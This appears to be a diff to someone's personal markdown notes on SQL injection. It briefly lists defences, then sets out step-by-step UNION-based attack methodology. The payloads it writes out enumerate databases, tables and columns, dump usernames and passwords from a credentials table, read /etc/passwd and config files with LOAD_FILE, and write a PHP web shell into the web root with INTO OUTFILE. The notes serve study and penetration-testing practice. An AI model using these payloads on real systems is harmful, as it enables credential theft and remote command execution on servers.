@@ -95,3 +95,75 @@ Types
 
     - Prepared Statement work by making sure that user supplied data does not alter you SQL query's logic. These SQL statements are sent to and compiled by the SQL server before any user supplied parameters into the query. User input is added to statement right before execution. Anything that wasn't in the original statement will be treated as string data, not the executable SQL code.
       ![image](https://github.com/th3-r3sistanc3/Notes/assets/71440632/d06ebb70-3ebf-4965-8ae8-b239007de2b7)
+
+2. Input Sanitization.
+
+3. Input Validation. 
+
+4. Use least previeleged user principle
+
+5. Use WAF
+
+
+## Methodology for UNION Based Attacks
+
+1. Try to find if parameter is vulnerable to SQLi
+   > Try adding ' or ''.
+
+2. Find number of columns present in table (As for UNION operation, two SELECT statement should have same number of columns)
+   > Use `' order by 1--` clause
+   > Can use `NULL` 
+
+3. Find which column's values are getting printed on screen.
+   > Try `@@version` at different columns to check.
+
+4. Find list of databases present
+   > schema_name contains name of databases in INFORMATION_SCHEMA database and SCHEMATA table
+   > cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+
+5. Find which database we are currently in.
+   > database()
+   > cn' UNION select 1,database(),2,3-- -
+
+
+6. Find list of tables in particular databases
+   > cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+   > TABLE_SCHEMA column points to the database each table belongs to.
+
+7. Find list of columns in particular table.
+   > cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+   > TABLE_NAME point to table name.
+
+8. Dump all values of coulmn of table
+   > cn' UNION select 1, username, password, 4 from dev.credentials-- -
+
+
+## Methodology to read file
+
+1. Find which user we are
+   > select user()
+
+2. Command to load file
+   > SELECT LOAD_FILE('/etc/passwd');
+   > cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+
+3.  Load any file
+   > cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
+
+4. `view source` code for entire PHP code.
+
+## Methodology to write into file
+
+1. SELECT * from users INTO OUTFILE '/tmp/credentials';
+
+2. SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+
+3. select 'file written successfully!' into outfile '/var/www/html/proof.txt'
+
+4. cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
+
+5. Shell --> cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
+
+## SQLMAP
+
+
